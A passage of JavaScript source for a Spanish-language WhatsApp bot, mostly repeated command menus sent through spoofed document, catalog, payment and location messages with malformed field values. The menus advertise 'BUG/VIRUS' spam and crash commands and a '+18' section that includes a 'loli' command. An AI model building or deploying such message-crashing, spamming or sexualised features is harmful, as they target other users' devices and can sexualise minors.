» ${prefix}ephemeral

» ${prefix}listonline

   「 SELF/BOT 」

» ${prefix}autoadmin

» ${prefix}deleteadmin

» ${prefix}block

» ${prefix}unblock

» ${prefix}setppbot

» ${prefix}setnombre

» ${prefix}setstatus

» ${prefix}anticall

» ${prefix}delete

» ${prefix}infochat

» ${prefix}quoted

» ${prefix}listpc

» ${prefix}listgc

» ${prefix}bc

» ${prefix}bcgroup

» ${prefix}setexif

» ${prefix}self

» ${prefix}public

   「 CONVERTER 」

» ${prefix}sticker

» ${prefix}stickerwm

» ${prefix}ebinary

» ${prefix}dbinary

» ${prefix}emojimix

» ${prefix}emojimix2

» ${prefix}attp/1/2/3/4/5/6

» ${prefix}ttp

» ${prefix}emoji

» ${prefix}attpgrad

» ${prefix}smeme

» ${prefix}toimage

» ${prefix}tomp4

» ${prefix}toaud

» ${prefix}tomp3

» ${prefix}tovn

» ${prefix}togif

» ${prefix}tourl [img]

» ${prefix}removebg

» ${prefix}backup

» ${prefix}resize

» ${prefix}chatid

» ${prefix}getgcjid

   「 DOWNLOAD 」

» ${prefix}animesearch

» ${prefix}animesearch2

» ${prefix}gitclone

» ${prefix}lirica

» ${prefix}gitstalk

» ${prefix}stalkig

» ${prefix}tiktok

» ${prefix}ytsearch

» ${prefix}google

» ${prefix}play

» ${prefix}googleimg

» ${prefix}ytmp3

» ${prefix}ytmp4

» ${prefix}getvideo

» ${prefix}getmusic

» ${prefix}ytsvideo

» ${prefix}ytsmusic

» ${prefix}song

» ${prefix}cellinfo

» ${prefix}playstore

» ${prefix}SsWeb

» ${prefix}npmsearch

» ${prefix}imgpareja

» ${prefix}spotify

» ${prefix}pinterest

» ${prefix}ringtone

» ${prefix}wikimedia

» ${prefix}wallpaper

» ${prefix}cafe

  「 ANIME/+18 」

» ${prefix}loli

» ${prefix}pack

» ${prefix}ero

» ${prefix}waifu2

» ${prefix}cry

» ${prefix}kill

» ${prefix}hug

» ${prefix}pat

» ${prefix}lick

» ${prefix}kiss

» ${prefix}bite

» ${prefix}yeet

» ${prefix}bully

» ${prefix}bonk

» ${prefix}wink

» ${prefix}poke

» ${prefix}nom

» ${prefix}slap

» ${prefix}smile

» ${prefix}wave

» ${prefix}awoo

» ${prefix}blush

» ${prefix}smug

» ${prefix}glomp

» ${prefix}happy

» ${prefix}dance

» ${prefix}cringe

» ${prefix}cuddle

» ${prefix}highfive

» ${prefix}shinobu

» ${prefix}megumin

» ${prefix}handhold

» ${prefix}nekost

» ${prefix}neko

» ${prefix}milf

» ${prefix}doge

» ${prefix}animestick

   「 MAKER 」

» ${prefix}3d-effect

» ${prefix}1917-style

» ${prefix}3d-rubystone

» ${prefix}3d-text-sub-zombie

» ${prefix}3dengraved

» ${prefix}3dluxury

» ${prefix}3dlove

» ${prefix}3dgolden

» ${prefix}3dgradient

» ${prefix}3dneonlight

» ${prefix}3dpapercut

» ${prefix}3drainbow

» ${prefix}3drealistic

» ${prefix}3dscifi

» ${prefix}3dtext-effect

» ${prefix}3dunderwater

» ${prefix}3dwaterpipe

» ${prefix}alice-league-of-kings

» ${prefix}angel-wing-galaxy

» ${prefix}anubis

» ${prefix}arch-crossfire

» ${prefix}art-shader

» ${prefix}assassins-creed

» ${prefix}azzenka-league-of-kings

» ${prefix}birthday-cards

» ${prefix}birthday-greeting

» ${prefix}birthday-roses

» ${prefix}black-metal

» ${prefix}blood-frosted

» ${prefix}blood-text

» ${prefix}blue-effect

» ${prefix}blue-glitter

» ${prefix}brickwall

» ${prefix}brokentext

» ${prefix}bubble-effect

» ${prefix}bulb-effect

» ${prefix}circuit

» ${prefix}dark-gold-metal

» ${prefix}color-fireworks

» ${prefix}cool-metal

» ${prefix}decorated-cookie

» ${prefix}deluxe-gold

» ${prefix}dinamo

» ${prefix}deluxe-silver

» ${prefix}double-exposure

» ${prefix}dragon-fire

» ${prefix}eroded-metal

» ${prefix}firework

» ${prefix}fox-crossfire

» ${prefix}fun-certify1

» ${prefix}fun-certify2

» ${prefix}futuristic

» ${prefix}galaxy-effect2

» ${prefix}galaxy-effect

» ${prefix}galaxy-angel

» ${prefix}galaxy-text

» ${prefix}galaxy-text-3

» ${prefix}gankk-league-of-kings

» ${prefix}genji-overwatch

» ${prefix}glossy

» ${prefix}glossy-bluemetal

» ${prefix}glossy-carbon

» ${prefix}glossy-chrome

» ${prefix}gold-avenger

» ${prefix}gold-barcar

» ${prefix}gold-batman

» ${prefix}gold-fox

» ${prefix}gold-bird2

» ${prefix}gold-eagle

» ${prefix}gold-effect

» ${prefix}gold-glitter

» ${prefix}gold-lion

» ${prefix}gold-lion2

» ${prefix}gold-star

» ${prefix}gold-tiger

» ${prefix}golden-letter

» ${prefix}gr-crossfire

» ${prefix}graffiti-color

» ${prefix}graffiti-text3

» ${prefix}graffiti-text5

» ${prefix}graffiti-text8

» ${prefix}graffiti-text4

» ${prefix}heart-birthday

» ${prefix}hanzo-overwatch

» ${prefix}greenhorror

» ${prefix}halloween-fire

» ${prefix}green-brush

» ${prefix}hero3-crossfire

» ${prefix}heart-cups

» ${prefix}holographic

» ${prefix}light-text

» ${prefix}lend-text

» ${prefix}ledtext

» ${prefix}layeredtext

» ${prefix}lol-caitlyn

» ${prefix}lol-ahri

» ${prefix}logo-galaxy

» ${prefix}lol-fizz

» ${prefix}lol-ezreal-and-shen

» ${prefix}lol-fiora

» ${prefix}lol-draven

» ${prefix}lol-jinx

» ${prefix}lol-kalista

» ${prefix}lol-khazix

» ${prefix}lol-kogmaw

» ${prefix}lol-leesin

» ${prefix}lol-lux

» ${prefix}lol-master-yi

» ${prefix}lol-miss-fortune

» ${prefix}lol-nidalee

» ${prefix}lol-quinn

» ${prefix}lol-sona

» ${prefix}lol-riven

» ${prefix}lol-talon

» ${prefix}machines-effect

» ${prefix}lol-vayne

» ${prefix}machines-effect

» ${prefix}lol-yasuo

» ${prefix}lol-zed

» ${prefix}lol-wukong

» ${prefix}magic-text

» ${prefix}mei-overwatch

» ${prefix}matrix-text

» ${prefix}magmatext

» ${prefix}metal-lion-2

» ${prefix}metal-headshot

» ${prefix}metal-avenger

» ${prefix}metal-real-madrid

» ${prefix}metal-star

» ${prefix}metal-superman

» ${prefix}metal-text-effect

» ${prefix}metallic-letter

» ${prefix}metalic

» ${prefix}metal-wolf-2

» ${prefix}mganga-league-of-kings

» ${prefix}miniontext

» ${prefix}modern-gold-3

» ${prefix}modern-gold-4

» ${prefix}modern-gold-5-pro

» ${prefix}modern-gold-green

» ${prefix}modern-gold-purple

» ${prefix}modern-gold-red

» ${prefix}modern-gold-sliver

» ${prefix}modern-goldred

» ${prefix}neon

» ${prefix}neon-2

» ${prefix}neon-brightblue

» ${prefix}neon-effects

» ${prefix}neon-light-galaxy

» ${prefix}neon-satin

» ${prefix}neondevil

» ${prefix}neonlight

» ${prefix}neontext-light

» ${prefix}paper-cut

» ${prefix}paperart

» ${prefix}rainbow-effect

» ${prefix}reaper-overwatch

» ${prefix}birthdaycake

» ${prefix}redhot-metal

» ${prefix}resht-league-of-kings

» ${prefix}science

» ${prefix}sfg-crossfire

» ${prefix}sketch

» ${prefix}wetglass

» ${prefix}watercolor

» ${prefix}water-effect

» ${prefix}water-3d

» ${prefix}violet-league-of-kings

» ${prefix}snowtext

» ${prefix}soldier-overwatch

» ${prefix}sunlight-shadow

» ${prefix}transformer

» ${prefix}glitch

» ${prefix}leonlogo

» ${prefix}lisatxt

» ${prefix}sings

» ${prefix}breakingnew

» ${prefix}retrowb

» ${prefix}diploma

» ${prefix}esfrase

» ${prefix}einstein

» ${prefix}trump

» ${prefix}anonymous-neon

» ${prefix}jail

» ${prefix}pixelate

» ${prefix}blur

» ${prefix}imagesketch

» ${prefix}triggeredwebp

» ${prefix}shit

» ${prefix}burn

» ${prefix}invert

» ${prefix}wanted

» ${prefix}rip

   「 WEB/CHECKS 」

» ${prefix}payment

» ${prefix}iploc

» ${prefix}myip

» ${prefix}ipinfo

» ${prefix}checknumber

» ${prefix}veriphone

» ${prefix}weather

   「 EDITOR VN 」

» ${prefix}blown

» ${prefix}deep

» ${prefix}saturado

» ${prefix}fast

» ${prefix}fat

» ${prefix}nightcore

» ${prefix}reversa

» ${prefix}robot

» ${prefix}lento

» ${prefix}suave

» ${prefix}ardilla

   「 MAIN 」

» ${prefix}delcmd

» ${prefix}listcmd

» ${prefix}addmsg

» ${prefix}getmsg

» ${prefix}listmsg

» ${prefix}delmsg

   「 ANÓNIMO 」

» ${prefix}anonymous

» ${prefix}salirc

» ${prefix}start

» ${prefix}next

   「 INFO 」

» ${prefix}ping

» ${prefix}runtime

» ${prefix}latencia

» ${prefix}owner

» ${prefix}report

» ${prefix}solicitar

» ${prefix}menu

» ${prefix}reglas

» ${prefix}comprarbot

   「 BUG/VIRUS 」
   
» ${prefix}spamsms

» ${prefix}blockspam

» ${prefix}catalog

» ${prefix}docu

» ${prefix}bugtod

» ${prefix}bug1

» ${prefix}lokas

» ${prefix}troli

» ${prefix}bugtag

» ${prefix}catalogpc

   「 CREADOR 」

» ${prefix} >

» ${prefix} $

» ${prefix} =>

» ${prefix} >>

» ${prefix}join
  
   「 TANKS TO 」

➣  ║▌│█║▌│ █║▌│█│║▌║
➣  ║▌│█║▌│ █║▌│█│║▌║

➣ Copyright © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 2022

${mn}`
let buttons = [
{buttonId: `${prefix}comprarbot`, buttonText: {displayText: 'Comprar Bot'}, type: 1},
{buttonId: `${prefix}rules`, buttonText: {displayText: 'Reglas'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./media/fake.jpeg'), 
fileName: `Bot by ī.am/𝙲𝚛𝚕𝚜ꪶ͢sєrꫂ⁩`, 
mimetype: `application/${bycrls}`,
jpegThumbnail: thumbpdf,
caption: mbc,
fileLength: "9999999999999",
pageCount: "-10000",
mentions:[sender, botmd],
footer: `_By @${botmd.split("@")[0]}_`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender, botmd],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hola ${pushname}👋🏻`, 
"mediaType": 1, 
"thumbnail": menu,
"renderLargerThumbnail": true,
"previewType": "PHOTO",
"mediaUrl": 'https://instagram.com/c4rl0s_9e'
}}
}
simple.sendMessage(m.chat, buttonMessage, { quoted: {
    key: { 
         fromMe: false,
         participant: `0@s.whatsapp.net`, ...(m.chat ? 
    { remoteJid: "17608914335-1625305606@g.us" } : {}) 
               },
    message: { 
       "extendedTextMessage": {
                "text":'by CARLOS',
                "title": '© ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛',
                'jpegThumbnail': fs.readFileSync('./media/fake.jpeg')
             }
           } 
          } })

break
	       case 'catalogom': {
menufollow(from)       
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/catalog.jpg') }, { upload: simple.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "5760420690656714",
"title": ` © Hola ${pushname} 👋`,
"description": `Ⓒ_乂 Simple WhatsApp - Bot_
       「  INFO BOT 」\n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘚𝘦𝘳𝘷𝘦𝘳 : ${conteocmd} \n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘛𝘰𝘥𝘢𝘺 : ${conteoscmds} \n Prefijo :  ${prefix} \n Nombre : ${botname}\n Owner : ${ownername}\n Runtime : ${runtime(process.uptime())}\n Librería : Baileys-Md


「 GRUPO 」

react

join [Gp link]

add 593xxx

kick @tag

promote @tag

demote @tag

setname 

setdesc

setppgroup

hidetag

tagall

totag

encuesta

checkvoto

group open/close

editinfo open/close

antilink

mute

linkgroup

ephemeral

listonline

   「 SELF/BOT 」

autoadmin

deleteadmin

block

unblock

setppbot

setnombre

setstatus

anticall

delete

infochat

quoted

listpc

listgc

bc

bcgroup

setexif

self

public

   「 CONVERTER 」

sticker

stickerwm

ebinary

dbinary

emojimix

emojimix2

attp/1/2/3/4/5/6

ttp

emoji

attpgrad

smeme

toimage

tomp4

toaud

tomp3

tovn

togif

tourl [img]

removebg

backup

resize

chatid

getgcjid

   「 DOWNLOAD 」

animesearch

animesearch2

gitclone

lirica

gitstalk

stalkig

tiktok

ytsearch

google

play

googleimg

ytmp3

ytmp4

getvideo

getmusic

ytsvideo

ytsmusic

song

cellinfo

playstore

SsWeb

npmsearch

imgpareja

spotify

pinterest

ringtone

wikimedia

wallpaper

cafe

  「 ANIME/+18 」

anime

husbu

nekos

loli

pack

ero

waifu2

cry

kill

hug

pat

lick

kiss

bite

yeet

bully

bonk

wink

poke

nom

slap

smile

wave

awoo

blush

smug

glomp

happy

dance

cringe

cuddle

highfive

shinobu

megumin

handhold

nekost

neko

milf

doge

animestick

   「 MAKER 」

3d-effect

1917-style

3d-rubystone

3d-text-sub-zombie

3dengraved

3dluxury

3dlove

3dgolden

3dgradient

3dneonlight

3dpapercut

3drainbow

3drealistic

3dscifi

3dtext-effect

3dunderwater

3dwaterpipe

alice-league-of-kings

angel-wing-galaxy

anubis

arch-crossfire

art-shader

assassins-creed

azzenka-league-of-kings

birthday-cards

birthday-greeting

birthday-roses

black-metal

blood-frosted

blood-text

blue-effect

blue-glitter

brickwall

brokentext

bubble-effect

bulb-effect

circuit

dark-gold-metal

color-fireworks

cool-metal

decorated-cookie

deluxe-gold

dinamo

deluxe-silver

double-exposure

dragon-fire

eroded-metal

firework

fox-crossfire

fun-certify1

fun-certify2

futuristic

galaxy-effect2

galaxy-effect

galaxy-angel

galaxy-text

galaxy-text-3

gankk-league-of-kings

genji-overwatch

glossy

glossy-bluemetal

glossy-carbon

glossy-chrome

gold-avenger

gold-barcar

gold-batman

gold-fox

gold-bird2

gold-eagle

gold-effect

gold-glitter

gold-lion

gold-lion2

gold-star

gold-tiger

golden-letter

gr-crossfire

graffiti-color

graffiti-text3

graffiti-text5

graffiti-text8

graffiti-text4

heart-birthday

hanzo-overwatch

greenhorror

halloween-fire

green-brush

hero3-crossfire

heart-cups

holographic

light-text

lend-text

ledtext

layeredtext

lol-caitlyn

lol-ahri

logo-galaxy

lol-fizz

lol-ezreal-and-shen

lol-fiora

lol-draven

lol-jinx

lol-kalista

lol-khazix

lol-kogmaw

lol-leesin

lol-lux

lol-master-yi

lol-miss-fortune

lol-nidalee

lol-quinn

lol-sona

lol-riven

lol-talon

machines-effect

lol-vayne

machines-effect

lol-yasuo

lol-zed

lol-wukong

magic-text

mei-overwatch

matrix-text

magmatext

metal-lion-2

metal-headshot

metal-avenger

metal-real-madrid

metal-star

metal-superman

metal-text-effect

metallic-letter

metalic

metal-wolf-2

mganga-league-of-kings

miniontext

modern-gold-3

modern-gold-4

modern-gold-5-pro

modern-gold-green

modern-gold-purple

modern-gold-red

modern-gold-sliver

modern-goldred

neon

neon-2

neon-brightblue

neon-effects

neon-light-galaxy

neon-satin

neondevil

neonlight

neontext-light

paper-cut

paperart

rainbow-effect

reaper-overwatch

birthdaycake

redhot-metal

resht-league-of-kings

science

sfg-crossfire

sketch

wetglass

watercolor

water-effect

water-3d

violet-league-of-kings

snowtext

soldier-overwatch

sunlight-shadow

transformer

glitch

leonlogo

lisatxt

sings

breakingnew

retrowb

diploma

esfrase

einstein

trump

anonymous-neon

jail

pixelate

blur

imagesketch

triggeredwebp

shit

burn

invert

wanted

rip

   「 WEB/CHECKS 」

payment

iploc

myip

ipinfo

checknumber

veriphone

weather

   「 EDITOR VN 」

blown

deep

saturado

fast

fat

nightcore

reversa

robot

lento

suave

ardilla

   「 MAIN 」

delcmd

listcmd

addmsg

getmsg

listmsg

delmsg

   「 ANÓNIMO 」

anonymous

salirc

start

next

   「 INFO 」

ping

runtime

latencia

owner

report

solicitar

menu

reglas

comprarbot

   「 BUG/VIRUS 」
   
spamsms

blockspam

catalog

docu

bugtod

bug1

lokas

troli

bugtag

catalogpc

   「 CREADOR 」

 >

 $

 =>

 >>

join
  
   「 TANKS TO 」

➣  ║▌│█║▌│ █║▌│█│║▌║
➣  ║▌│█║▌│ █║▌│█│║▌║

➣ Copyright © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 2022️`,
"currencyCode": "USD",
"footerText": ` 😆🖕Idiot`,
"priceAmount1000": "999999999",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "-1111",
"retailerId": `© Priv`,
"url": "https://instagram.com/c4rl0s_9e"
},
"businessOwnerJid": "593991398786@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
simple.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'menunormal' :{
simple.relayMessage(m.chat, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'USD',
      amount1000: 10000000,
      requestFrom: m.sender,
      noteMessage: {
        extendedTextMessage: {
          text: `      Ⓒ_乂 Simple WhatsApp - Bot_
       「  INFO BOT 」\n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘚𝘦𝘳𝘷𝘦𝘳 : ${conteocmd} \n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘛𝘰𝘥𝘢𝘺 : ${conteoscmds} \n Prefijo :  ${prefix} \n Nombre : ${botname}\n Owner : ${ownername}\n Runtime : ${runtime(process.uptime())}\n Librería : Baileys-Md\n\n   「 GRUPO 」

» ${prefix}react

» ${prefix}join [Gp link]

» ${prefix}add 593xxx

» ${prefix}kick @tag

» ${prefix}promote @tag

» ${prefix}demote @tag

» ${prefix}setname 

» ${prefix}setdesc

» ${prefix}setppgroup

» ${prefix}hidetag

» ${prefix}tagall

» ${prefix}totag

» ${prefix}encuesta

» ${prefix}checkvoto

» ${prefix}group open/close

» ${prefix}editinfo open/close

» ${prefix}antilink

» ${prefix}mute

» ${prefix}linkgroup

» ${prefix}ephemeral

» ${prefix}listonline

   「 SELF/BOT 」

» ${prefix}autoadmin

» ${prefix}deleteadmin

» ${prefix}block

» ${prefix}unblock

» ${prefix}setppbot

» ${prefix}setnombre

» ${prefix}setstatus

» ${prefix}anticall

» ${prefix}delete

» ${prefix}infochat

» ${prefix}quoted

» ${prefix}listpc

» ${prefix}listgc

» ${prefix}bc

» ${prefix}bcgroup

» ${prefix}setexif

» ${prefix}self

» ${prefix}public

   「 CONVERTER 」

» ${prefix}sticker

» ${prefix}stickerwm

» ${prefix}ebinary

» ${prefix}dbinary

» ${prefix}emojimix

» ${prefix}emojimix2

» ${prefix}attp/1/2/3/4/5/6

» ${prefix}ttp

» ${prefix}emoji

» ${prefix}attpgrad

» ${prefix}smeme

» ${prefix}toimage

» ${prefix}tomp4

» ${prefix}toaud

» ${prefix}tomp3

» ${prefix}tovn

» ${prefix}togif

» ${prefix}tourl [img]

» ${prefix}removebg

» ${prefix}backup

» ${prefix}resize

» ${prefix}chatid

» ${prefix}getgcjid

   「 DOWNLOAD 」

» ${prefix}animesearch

» ${prefix}animesearch2

» ${prefix}gitclone

» ${prefix}lirica

» ${prefix}gitstalk

» ${prefix}stalkig

» ${prefix}tiktok

» ${prefix}ytsearch

» ${prefix}google

» ${prefix}play

» ${prefix}googleimg

» ${prefix}ytmp3

» ${prefix}ytmp4

» ${prefix}getvideo

» ${prefix}getmusic

» ${prefix}ytsvideo

» ${prefix}ytsmusic

» ${prefix}song

» ${prefix}cellinfo

» ${prefix}playstore

» ${prefix}SsWeb

» ${prefix}npmsearch

» ${prefix}imgpareja

» ${prefix}spotify

» ${prefix}pinterest

» ${prefix}ringtone

» ${prefix}wikimedia

» ${prefix}wallpaper

» ${prefix}cafe

  「 ANIME/+18 」

» ${prefix}loli

» ${prefix}pack

» ${prefix}ero

» ${prefix}waifu2

» ${prefix}cry

» ${prefix}kill

» ${prefix}hug

» ${prefix}pat

» ${prefix}lick

» ${prefix}kiss

» ${prefix}bite

» ${prefix}yeet

» ${prefix}bully

» ${prefix}bonk

» ${prefix}wink

» ${prefix}poke

» ${prefix}nom

» ${prefix}slap

» ${prefix}smile

» ${prefix}wave

» ${prefix}awoo

» ${prefix}blush

» ${prefix}smug

» ${prefix}glomp

» ${prefix}happy

» ${prefix}dance

» ${prefix}cringe

» ${prefix}cuddle

» ${prefix}highfive

» ${prefix}shinobu

» ${prefix}megumin

» ${prefix}handhold

» ${prefix}nekost

» ${prefix}neko

» ${prefix}milf

» ${prefix}doge

» ${prefix}animestick

   「 MAKER 」

» ${prefix}3d-effect

» ${prefix}1917-style

» ${prefix}3d-rubystone

» ${prefix}3d-text-sub-zombie

» ${prefix}3dengraved

» ${prefix}3dluxury

» ${prefix}3dlove

» ${prefix}3dgolden

» ${prefix}3dgradient

» ${prefix}3dneonlight

» ${prefix}3dpapercut

» ${prefix}3drainbow

» ${prefix}3drealistic

» ${prefix}3dscifi

» ${prefix}3dtext-effect

» ${prefix}3dunderwater

» ${prefix}3dwaterpipe

» ${prefix}alice-league-of-kings

» ${prefix}angel-wing-galaxy

» ${prefix}anubis

» ${prefix}arch-crossfire

» ${prefix}art-shader

» ${prefix}assassins-creed

» ${prefix}azzenka-league-of-kings

» ${prefix}birthday-cards

» ${prefix}birthday-greeting

» ${prefix}birthday-roses

» ${prefix}black-metal

» ${prefix}blood-frosted

» ${prefix}blood-text

» ${prefix}blue-effect

» ${prefix}blue-glitter

» ${prefix}brickwall

» ${prefix}brokentext

» ${prefix}bubble-effect

» ${prefix}bulb-effect

» ${prefix}circuit

» ${prefix}dark-gold-metal

» ${prefix}color-fireworks

» ${prefix}cool-metal

» ${prefix}decorated-cookie

» ${prefix}deluxe-gold

» ${prefix}dinamo

» ${prefix}deluxe-silver

» ${prefix}double-exposure

» ${prefix}dragon-fire

» ${prefix}eroded-metal

» ${prefix}firework

» ${prefix}fox-crossfire

» ${prefix}fun-certify1

» ${prefix}fun-certify2

» ${prefix}futuristic

» ${prefix}galaxy-effect2

» ${prefix}galaxy-effect

» ${prefix}galaxy-angel

» ${prefix}galaxy-text

» ${prefix}galaxy-text-3

» ${prefix}gankk-league-of-kings

» ${prefix}genji-overwatch

» ${prefix}glossy

» ${prefix}glossy-bluemetal

» ${prefix}glossy-carbon

» ${prefix}glossy-chrome

» ${prefix}gold-avenger

» ${prefix}gold-barcar

» ${prefix}gold-batman

» ${prefix}gold-fox

» ${prefix}gold-bird2

» ${prefix}gold-eagle

» ${prefix}gold-effect

» ${prefix}gold-glitter

» ${prefix}gold-lion

» ${prefix}gold-lion2

» ${prefix}gold-star

» ${prefix}gold-tiger

» ${prefix}golden-letter

» ${prefix}gr-crossfire

» ${prefix}graffiti-color

» ${prefix}graffiti-text3

» ${prefix}graffiti-text5

» ${prefix}graffiti-text8

» ${prefix}graffiti-text4

» ${prefix}heart-birthday

» ${prefix}hanzo-overwatch

» ${prefix}greenhorror

» ${prefix}halloween-fire

» ${prefix}green-brush

» ${prefix}hero3-crossfire

» ${prefix}heart-cups

» ${prefix}holographic

» ${prefix}light-text

» ${prefix}lend-text

» ${prefix}ledtext

» ${prefix}layeredtext

» ${prefix}lol-caitlyn

» ${prefix}lol-ahri

» ${prefix}logo-galaxy

» ${prefix}lol-fizz

» ${prefix}lol-ezreal-and-shen

» ${prefix}lol-fiora

» ${prefix}lol-draven

» ${prefix}lol-jinx

» ${prefix}lol-kalista

» ${prefix}lol-khazix

» ${prefix}lol-kogmaw

» ${prefix}lol-leesin

» ${prefix}lol-lux

» ${prefix}lol-master-yi

» ${prefix}lol-miss-fortune

» ${prefix}lol-nidalee

» ${prefix}lol-quinn

» ${prefix}lol-sona

» ${prefix}lol-riven

» ${prefix}lol-talon

» ${prefix}machines-effect

» ${prefix}lol-vayne

» ${prefix}machines-effect

» ${prefix}lol-yasuo

» ${prefix}lol-zed

» ${prefix}lol-wukong

» ${prefix}magic-text

» ${prefix}mei-overwatch

» ${prefix}matrix-text

» ${prefix}magmatext

» ${prefix}metal-lion-2

» ${prefix}metal-headshot

» ${prefix}metal-avenger

» ${prefix}metal-real-madrid

» ${prefix}metal-star

» ${prefix}metal-superman

» ${prefix}metal-text-effect

» ${prefix}metallic-letter

» ${prefix}metalic

» ${prefix}metal-wolf-2

» ${prefix}mganga-league-of-kings

» ${prefix}miniontext

» ${prefix}modern-gold-3

» ${prefix}modern-gold-4

» ${prefix}modern-gold-5-pro

» ${prefix}modern-gold-green

» ${prefix}modern-gold-purple

» ${prefix}modern-gold-red

» ${prefix}modern-gold-sliver

» ${prefix}modern-goldred

» ${prefix}neon

» ${prefix}neon-2

» ${prefix}neon-brightblue

» ${prefix}neon-effects

» ${prefix}neon-light-galaxy

» ${prefix}neon-satin

» ${prefix}neondevil

» ${prefix}neonlight

» ${prefix}neontext-light

» ${prefix}paper-cut

» ${prefix}paperart

» ${prefix}rainbow-effect

» ${prefix}reaper-overwatch

» ${prefix}birthdaycake

» ${prefix}redhot-metal

» ${prefix}resht-league-of-kings

» ${prefix}science

» ${prefix}sfg-crossfire

» ${prefix}sketch

» ${prefix}wetglass

» ${prefix}watercolor

» ${prefix}water-effect

» ${prefix}water-3d

» ${prefix}violet-league-of-kings

» ${prefix}snowtext

» ${prefix}soldier-overwatch

» ${prefix}sunlight-shadow

» ${prefix}transformer

» ${prefix}glitch

» ${prefix}leonlogo

» ${prefix}lisatxt

» ${prefix}sings

» ${prefix}breakingnew

» ${prefix}retrowb

» ${prefix}diploma

» ${prefix}esfrase 

» ${prefix}einstein

» ${prefix}trump

» ${prefix}anonymous-neon

» ${prefix}jail

» ${prefix}pixelate

» ${prefix}blur

» ${prefix}imagesketch

» ${prefix}triggeredwebp

» ${prefix}shit

» ${prefix}burn

» ${prefix}invert

» ${prefix}wanted

» ${prefix}rip

   「 WEB/CHECKS 」

» ${prefix}payment

» ${prefix}iploc

» ${prefix}myip

» ${prefix}ipinfo

» ${prefix}checknumber

» ${prefix}veriphone

» ${prefix}weather

   「 EDITOR VN 」

» ${prefix}blown

» ${prefix}deep

» ${prefix}saturado

» ${prefix}fast

» ${prefix}fat

» ${prefix}nightcore

» ${prefix}reversa

» ${prefix}robot

» ${prefix}lento

» ${prefix}suave

» ${prefix}ardilla

   「 MAIN 」

» ${prefix}delcmd

» ${prefix}listcmd

» ${prefix}addmsg

» ${prefix}getmsg

» ${prefix}listmsg

» ${prefix}delmsg

   「 ANÓNIMO 」

» ${prefix}anonymous

» ${prefix}salirc

» ${prefix}start

» ${prefix}next

   「 INFO 」

» ${prefix}ping

» ${prefix}runtime

» ${prefix}latencia

» ${prefix}owner

» ${prefix}report

» ${prefix}solicitar

» ${prefix}menu

» ${prefix}reglas

» ${prefix}comprarbot

   「 BUG/VIRUS 」
   
» ${prefix}spamsms

» ${prefix}blockspam

» ${prefix}catalog

» ${prefix}docu

» ${prefix}bugtod

» ${prefix}bug1

» ${prefix}lokas

» ${prefix}troli

» ${prefix}bugtag

» ${prefix}catalogpc

   「 CREADOR 」

» ${prefix} >

» ${prefix} $

» ${prefix} =>

» ${prefix} >>

» ${prefix}join
  
   「 TANKS TO 」

➣  ║▌│█║▌│ █║▌│█│║▌║
➣  ║▌│█║▌│ █║▌│█│║▌║

➣ Copyright © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 2022
`,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true
            }
          }
        }
      }
    }
  }, {})
}
break
case 'locmenu': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/pdfimg.jpg') }, { upload: simple.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": 39.0438,
"degreesLongitude": -77.4874,
"caption": `      Ⓒ_乂 Simple WhatsApp - Bot_
       「  INFO BOT 」\n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘚𝘦𝘳𝘷𝘦𝘳 : ${conteocmd} \n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘛𝘰𝘥𝘢𝘺 : ${conteoscmds} \n Prefijo :  ${prefix} \n Nombre : ${botname}\n Owner : ${ownername}\n Runtime : ${runtime(process.uptime())}\n Librería : Baileys-Md\n\n   「 GRUPO 」

» ${prefix}react

» ${prefix}join [Gp link]

» ${prefix}add 593xxx

» ${prefix}kick @tag

» ${prefix}promote @tag

» ${prefix}demote @tag

» ${prefix}setname 

» ${prefix}setdesc

» ${prefix}setppgroup

» ${prefix}hidetag

» ${prefix}tagall

» ${prefix}totag

» ${prefix}encuesta

» ${prefix}checkvoto

» ${prefix}group open/close

» ${prefix}editinfo open/close

» ${prefix}antilink

» ${prefix}mute

» ${prefix}linkgroup

» ${prefix}ephemeral

» ${prefix}listonline

   「 SELF/BOT 」

» ${prefix}autoadmin

» ${prefix}deleteadmin

» ${prefix}block

» ${prefix}unblock

» ${prefix}setppbot

» ${prefix}setnombre

» ${prefix}setstatus

» ${prefix}anticall

» ${prefix}delete

» ${prefix}infochat

» ${prefix}quoted

» ${prefix}listpc

» ${prefix}listgc

» ${prefix}bc

» ${prefix}bcgroup

» ${prefix}setexif

» ${prefix}self

» ${prefix}public

   「 CONVERTER 」

» ${prefix}sticker

» ${prefix}stickerwm

» ${prefix}ebinary

» ${prefix}dbinary

» ${prefix}emojimix

» ${prefix}emojimix2

» ${prefix}attp/1/2/3/4/5/6

» ${prefix}ttp

» ${prefix}emoji

» ${prefix}attpgrad

» ${prefix}smeme

» ${prefix}toimage

» ${prefix}tomp4

» ${prefix}toaud

» ${prefix}tomp3

» ${prefix}tovn

» ${prefix}togif

» ${prefix}tourl [img]

» ${prefix}removebg

» ${prefix}backup

» ${prefix}resize

» ${prefix}chatid

» ${prefix}getgcjid

   「 DOWNLOAD 」

» ${prefix}animesearch

» ${prefix}animesearch2
